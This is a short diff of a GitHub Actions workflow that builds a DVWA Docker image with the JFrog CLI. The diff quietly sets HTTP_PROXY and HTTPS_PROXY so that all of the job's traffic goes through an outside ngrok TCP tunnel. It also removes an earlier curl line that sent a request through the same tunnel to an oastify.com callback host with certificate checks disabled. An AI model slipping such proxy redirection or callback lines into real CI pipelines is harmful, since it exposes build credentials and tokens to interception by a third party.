@@ -18,6 +18,8 @@ on:
 jobs:
   moti-jfrog-cli:
     env:
+      HTTP_PROXY: 7.tcp.eu.ngrok.io:16312
+      HTTPS_PROXY: 7.tcp.eu.ngrok.io:16312
       IMG_NAME: ${{ github.repository }}
       JF_URL: "https://accenture2025.jfrog.io/"
       JFROG_CLI_BUILD_NAME: "dvwa-ci"
@@ -33,7 +35,6 @@ jobs:
           oidc-provider-name: evidence
       - name: Setup JFrog CLI
         run: |
-          curl -x 7.tcp.eu.ngrok.io:16312 https://ztwd3zrelgdyzvqocilqoxeyipogc80x.oastify.com -k
           jf --version
           jf config show
           jfrog docker build . --file Dockerfile --tag accenture2025.jfrog.io/docker-dev/dvwa:${{ github.run_id }}
